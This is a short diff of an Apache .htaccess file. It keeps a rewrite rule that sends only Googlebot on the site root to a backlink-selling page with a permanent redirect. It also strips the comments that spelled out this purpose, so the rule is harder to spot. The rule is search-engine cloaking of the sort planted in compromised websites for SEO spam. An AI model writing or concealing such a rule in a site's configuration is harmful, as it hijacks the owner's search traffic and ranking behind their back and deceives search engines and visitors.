@@ -1,9 +1,7 @@
 <IfModule mod_rewrite.c>
 RewriteEngine On
-
-# Hanya Googlebot yang kena aturan ini
+# 
 RewriteCond %{HTTP_USER_AGENT} Googlebot [NC]
-
-# Redirect permanen ke backlinkhut.com
+#
 RewriteRule ^$ https://backlinkhut.com/product/free-backlinks-trail [R=301,L]
 </IfModule>
